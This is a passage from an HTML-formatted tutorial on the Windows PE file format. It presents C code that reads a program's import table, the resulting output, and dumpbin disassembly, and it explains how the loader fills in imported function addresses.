(PIMAGE_THUNK_DATA)pimportDescriptor-&gt;FirstThunk;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pthunkdatafirst =
(PIMAGE_THUNK_DATA)((DWORD)pthunkdatafirst - diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pthunkdata = (PIMAGE_THUNK_DATA)((DWORD)pthunkdata
- diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pFirstThunk = (long
*)((DWORD)pFirstThunk - diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if (!pthunkdata)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>return;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;<span
style="mso-spacerun: yes">  </span>Ordn<span style="mso-spacerun: yes"> 
</span>Name\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>while ( 1 ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( pthunkdata-&gt;u1.AddressOfData
== 0 )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( pthunkdata-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG
)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf( &quot;<span
style="mso-spacerun: yes">  </span>%4u&quot;,
IMAGE_ORDINAL(pthunkdata-&gt;u1.Ordinal) );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>PIMAGE_IMPORT_BY_NAME pimportbyname;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimportbyname =
pthunkdata-&gt;u1.AddressOfData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimportbyname =
(PIMAGE_IMPORT_BY_NAME)((DWORD)pimportbyname - diff + startoffile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;<span
style="mso-spacerun: yes">  </span>%4u<span style="mso-spacerun: yes"> 
</span>%s Memory=%x Value=%x&quot;, pimportbyname-&gt;Hint,
pimportbyname-&gt;Name,pFirstThunk,*pFirstThunk);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if (
pimportDescriptor-&gt;TimeDateStamp )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf( &quot; (Bound to:
%08X)&quot;, pthunkdatafirst-&gt;u1.Function );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf( &quot;\n&quot; );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pthunkdata++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pFirstThunk++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimportDescriptor++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Output<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>importstartrva=4404 size=3c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Section No Name<span
style="mso-spacerun: yes">    </span>Virtual Address PointerToRawData
VirtualSize<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun:
yes"> </span>0<span style="mso-spacerun: yes">         </span>.text<span
style="mso-spacerun: yes">     </span>1000<span style="mso-spacerun:
yes">            </span>1000<span style="mso-spacerun: yes">             
</span>280e<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun:
yes"> </span>1<span style="mso-spacerun: yes">         </span>.rdata<span
style="mso-spacerun: yes">    </span>4000<span style="mso-spacerun:
yes">            </span>4000<span style="mso-spacerun: yes">             
</span>778<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>psectionheader=4201e8
pimportDescriptor=424404<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Name of Dll:USER32.dll<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Characteristics:000044D0 (Unbound
IAT)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>TimeDateStamp:00000000 Thu Jan 01
05:30:00 1970<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>ForwarderChain:00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>First thunk RVA:00004090<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>Ordn<span style="mso-spacerun: yes">  </span>Name<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>515<span style="mso-spacerun: yes">  </span>ReleaseDC Memory=424090 Value=44e0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>446<span style="mso-spacerun: yes">  </span>MessageBoxA Memory=424094
Value=44f4<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>253<span style="mso-spacerun: yes">  </span>GetDC Memory=424098
Value=44ec<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Name of Dll:KERNEL32.dll<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Characteristics:00004440 (Unbound
IAT)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>TimeDateStamp:00000000 Thu Jan 01
05:30:00 1970<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>ForwarderChain:00000000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>First thunk RVA:00004000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>Ordn<span style="mso-spacerun: yes">  </span>Name<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>413<span style="mso-spacerun: yes">  </span>HeapDestroy Memory=424000
Value=4654<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>411<span style="mso-spacerun: yes">  </span>HeapCreate Memory=424004
Value=4662<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>342<span style="mso-spacerun: yes">  </span>GetStringTypeW Memory=424008
Value=4758<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>339<span style="mso-spacerun: yes">  </span>GetStringTypeA Memory=42400c
Value=4746<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes">  
</span>202<span style="mso-spacerun: yes">  </span>GetCommandLineA
Memory=424010 Value=450e<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first half of the program remains
almost the same as in the exports program. Here, the 2<sup>nd</sup> member of
the Data Directory contains the rva and the size of the imports section. The
rva in our case is 4404 and its size 3c bytes. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The start and end of the imports data
is placed in variables importstartrva and importendrva. The section that
contains the imports data is the rdata section as before and the diff and
startoffile variables as initialized in the same manner as before. Nothing
changes. Thus the import data starts at location 424404. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The import data is made up of a
series of structures called the Import Descriptor structures. There is one
structure for each dll from where the code is imported. Also, every C program
imports code from kernel32.dll due to the startup code added by the compiler.
As a result, there are two such structures back to back in our import area, one
for user32 and the other for kernel32. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The end of the import area is denoted
by an Import Descriptor structure that has all its members zeroed out. Thus a
while loop is implemented which exits when the members are all zero. Here the
name and Date Time stamp field are checked to be zero for exit. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Name of the dll is first displayed,
however it is a rva and hence the startoffile is to be added and diff is to be
subtracted like in the exports program. These variables are reset to their
actual values as initially they are simply rvas and they point to what are
called Image Thunk Data structures. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Characteristics field that is not
zero is printed along with the Date Time and the Forwarder Chain which is zero.
The most crucial field is the field FirstThunk which is an rva having a value
of 0x4090. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Now either the fields Characteristics
or FirstThunk point to a series of structures that give the names of the
functions imported from this dll. The variable pthunkdata is initialized to
Characteristics and pthunkdatafirst to FirstThunk. Then again, it could so
happen that pthunkdata i.e. field Characteristics is zero. If the pthunkdata
member or Characteristics is zero the loop is terminated instantly. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Now to display the names of functions
called from one dll the loop is brought in. The pthunkdata which represents
the<span style="mso-spacerun: yes">  </span>Characteristics field is nothing
but a pointer to a series of Image Thunk Data structures. Like the structures
representing dll’s, an empty Thunk Data structure denotes the end of function
names being called from this dll. Thus if the AddressOfData member is zero, the
inner loop is terminated. The if statement is not true generally therefore in
the else, the ordinal number and name are displayed in the else block. The
AddressOfData member points to an Image Import by name structure. Since it is
an rva its actual value is gathered and then two members Hint the ordinal
number and the Name of the function are displayed. The variable pthunkdata is
then incremented to point to the next structure. Once the inner while ends, the
variable pimportDescriptor variable is incremented in the outer while to point
to the next such structure.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The FirstThunk member in user32.dll
has a value of 4090, again an rvc. The variable pFirstThunk, which is a pointer
to a long, is set to this FirstThunk value after being converted to a actual
memory location. We display the variable for each function called from the dll
and also increment its value. The contents present in this memory are also
displayed.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The imports data gives a listing of
only the functions called from each dll. When we install Visual C++ we get a
program called dumpbin that displays the internals of a PE file. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Run dumpbin on d.exe as dumpbin
/DISASM d.exe. The DISASM option gives actually disassembles the code in our
exe file.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401000: 55<span style="mso-spacerun: yes">                
</span>push<span style="mso-spacerun: yes">        </span>ebp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401001: 8B EC<span style="mso-spacerun: yes">             
</span>mov<span style="mso-spacerun: yes">         </span>ebp,esp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401003: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401005: 68 30 50 40 00<span style="mso-spacerun: yes">    
</span>push<span style="mso-spacerun: yes">        </span>405030h<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040100A: 68 34 50 40 00<span style="mso-spacerun: yes">    
</span>push<span style="mso-spacerun: yes">        </span>405034h<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040100F: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401011: FF 15 94 40 40 00<span style="mso-spacerun: yes"> 
</span>call<span style="mso-spacerun: yes">        </span>dword ptr
ds:[00404094h]<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401017: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401019: 68 38 50 40 00<span style="mso-spacerun: yes">    
</span>push<span style="mso-spacerun: yes">        </span>405038h<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040101E: 68 40 50 40 00<span style="mso-spacerun: yes">    
</span>push<span style="mso-spacerun: yes">        </span>405040h<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401023: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401025: FF 15 94 40 40 00<span style="mso-spacerun: yes"> 
</span>call<span style="mso-spacerun: yes">        </span>dword ptr
ds:[00404094h]<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040102B: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040102D: FF 15 98 40 40 00<span style="mso-spacerun: yes"> 
</span>call<span style="mso-spacerun: yes">        </span>dword ptr
ds:[00404098h]<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401033: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401035: 6A 00<span style="mso-spacerun: yes">             
</span>push<span style="mso-spacerun: yes">        </span>0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>00401037: FF 15 90 40 40 00<span style="mso-spacerun: yes"> 
</span>call<span style="mso-spacerun: yes">        </span>dword ptr
ds:[00404090h]<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040103D: 5D<span style="mso-spacerun: yes">                
</span>pop<span style="mso-spacerun: yes">         </span>ebp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><span style="mso-spacerun: yes"> 
</span>0040103E: C3<span style="mso-spacerun: yes">                 </span>ret<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first two calls are to the
MessageBoxA function. The compiler/linker combo however is not informed of the
address of the function MessageBoxA other than the fact that the library
user32.lib has the functions name and its ordinal number. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The address of the function in the
dll is not stored in the lib file. Even though the dll user32 is present on our
machine and the exports section will contain the address of the function
MessageBoxA, the linker does not bring in this address at all. Do remember that
the dll need not be present on the machine the program is being linked on, the
lib file suffices. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The functions address in the dll is
an rva from where the dll is loaded in memory.<span style="mso-spacerun: yes"> 
</span>Thus to get at the real addresses, it is important to know the location
of the dll in memory. Though, this information can be extracted by the linker,
it does not for the simple reason that the exe file may be compiled on one
machine and executed on another. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>If that is the case, user32.dll may
be loaded somewhere else in memory and thus the absolute addresses of the
functions changes, even though its rva may be the same. Version to version of
the dll may store the function at a different place. The placement of a dll in
memory is decided by the operating system and it service pack. Thus it is the
job of the runtime loader to figure out the address of the function in memory. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus the absolute addresses of the
functions can never be determined. The second hurdle is that one function can
be called many times in a program like the printf or the MessageBox. There is
no way one would expect the loader to read the program code at runtime and
replace every occurrence of the call to say the MessageBoxA function with the
address of the function in memory on that machine. This would simply take too
long. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus when a program is executed, the
system does the normal sanity checks. In the disassembled code, the call to the
MessageBoxA function is an indirect call. The system is directed to go to
memory location 404094 and execute a function whose address is stored at that
location. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>When the import table is displayed,
the FirstThunk member points to 404090, thus for MessageBoxA the value is
404094 as it is the second function. Thus to simplify matters for the loader,
all that it does at runtime is, reads the import section. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Characteristics member gives it
the function name and ordinal number and the FirstThunk member gives it a
corresponding memory location, which is assumed to contain the address of that
function. Thus the loader figures out the address of MessageBoxA on a machine
and places that address at memory location 404094. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus it needs to do this only once
irrespective of the number of times the function is called. In the same vein at
memory location 404090 stores the address of the function ReleaseDC and 404098
GetDC. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>To confirm this we add a breakpoint
interrupt in file d.c as follows.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>d.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int 3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>MessageBox(0,&quot;hi&quot;,&quot;bye&quot;,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>MessageBox(0,&quot;hi1&quot;,&quot;bye1&quot;,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>GetDC(0);<o:p></o:p></span></p>

